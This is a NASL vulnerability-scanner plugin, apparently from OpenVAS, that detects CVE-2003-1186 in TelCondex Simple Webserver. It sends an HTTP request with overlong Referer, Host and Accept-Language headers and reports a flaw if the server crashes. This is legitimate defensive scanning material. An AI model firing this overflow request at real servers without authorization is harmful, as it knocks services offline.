# SPDX-FileCopyrightText: 2003 Matt North
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11927");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-1186");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("TelCondex Simple Webserver Buffer Overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2003 Matt North");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.yourinfosystem.de/download/TcSimpleWebServer2000Setup.exe");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/8925");

  script_tag(name:"solution", value:"Upgrade to version 2.13.");

  script_tag(name:"summary", value:"The TelCondex SimpleWebserver is vulnerable to a remote executable
  buffer overflow, due to missing length check on the referer-variable of the HTTP-header.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if(http_is_dead(port:port)) exit(0);

s = string( "GET / HTTP/1.1\r\n",
            "Accept: */* \r\n" ,
            "Referer:", crap(704), "\r\n",
            "Host:" , crap(704), "\r\n",
            "Accept-Language",
            crap(704), "\r\n\r\n" );

soc =  http_open_socket(port);
if(!soc) exit(0);

send(socket: soc, data: s);
r = http_recv(socket: soc);
http_close_socket(soc);

if(http_is_dead(port: port)) {
  security_message(port: port);
}
